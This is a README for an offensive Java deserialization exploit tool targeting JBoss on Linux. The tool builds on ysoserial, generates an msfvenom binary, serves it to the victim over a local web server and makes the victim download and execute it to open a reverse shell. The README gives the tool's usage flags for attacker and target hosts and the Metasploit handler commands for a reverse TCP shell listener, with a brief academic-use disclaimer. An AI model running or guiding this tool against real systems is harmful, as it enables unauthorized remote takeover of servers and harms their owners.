# Java Deserialization Exploit

A tool which weaponizes frohoff's original ysoserial code to gain a remote shell on vulnerable Linux machines.

## Description

This tool builds upon the proof-of-concept ysoserial by Chris Frohoff (https://github.com/frohoff/ysoserial) and exploits
the Java Deserialization vulnerability, using Metasploit Framework tools to generate a malicious binary and an embedded
web server to transfer the payload to the victim. A slightly modified version of ysoserial is used to download and
execute the binary on the victim's side.

__Note:__ This tool is still in early stages of development, and many features have not yet been implemented. Only the
JBoss platform on the Linux architecture is currently exploitable.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$ java -jar JBossExploit.jar
usage: java -jar JBossExploit.jar -lhost <host> -mport <port> -rhost
            <host> -rport <port> -srvport <port>
 -help             print this message
 -lhost <host>     IP Address of Attacking Machine
 -mport <port>     Port on which local handler is listening for a reverse
                   TCP shell
 -rhost <host>     Target Hostname or IP Address
 -rport <port>     Remote JBoss Port
 -srvport <port>   Port for local HTTP server
```

## Examples

Coming soon.


## Requirements

* Metasploit Framework -- You must have a listener running in msfconsole before running this exploit. Example:

```shell
$ msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload linux/x86/shell/reverse_tcp
msf exploit(handler) > set LHOST <local ip>
msf exploit(handler) > set LPORT <local port>
msf exploit(handler) > exploit
```

* msfvenom must be installed and available in your PATH. This command is used to generate the reverse shell payload.
